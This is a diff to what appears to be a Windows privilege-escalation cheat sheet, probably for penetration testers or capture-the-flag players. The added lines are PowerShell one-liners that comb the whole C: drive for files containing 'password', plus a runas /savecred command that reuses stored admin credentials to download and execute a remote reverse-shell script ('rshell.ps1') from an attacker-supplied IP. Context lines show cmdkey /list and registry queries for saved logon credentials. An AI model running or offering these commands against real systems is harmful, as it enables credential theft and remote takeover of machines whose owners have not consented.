@@ -51,6 +51,11 @@ Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction Si
 Get-ChildItem -Path C:\Users\ -Include *.txt,*.xml,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
 # search in hidden directories too (-Force)
 Get-ChildItem -Path C:\Users\ -Include *.txt, *.xml -File -Recurse -Force -ErrorAction SilentlyContinue
+
+# search for passwords in all files
+Get-ChildItem -Path C:\ -Recurse -File -Force -ErrorAction SilentlyContinue | Select-String -Pattern "password" -ErrorAction SilentlyContinue
+# search for passwords in specific file types
+Get-ChildItem -Path C:\ -Recurse -File -Force -Include "*.txt","*.config","*.json" -ErrorAction SilentlyContinue | Select-String -Pattern "password" -ErrorAction SilentlyContinue
 ```
 
 ## Passwords
@@ -82,8 +87,10 @@ reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
 # show stored credentials
 cmdkey /list
 
-# transfer a reverse shell and execute it with the credentials
+# transfer a reverse shell and execute it with the credentials or directly with PS
 runas /savecred /user:admin reverse.exe
+runas /savecred /user:admin "powershell -c IEX (New-Object
+Net.Webclient).downloadstring('http://<ip>/rshell.ps1')"
 ```
 
 ### RunasCs
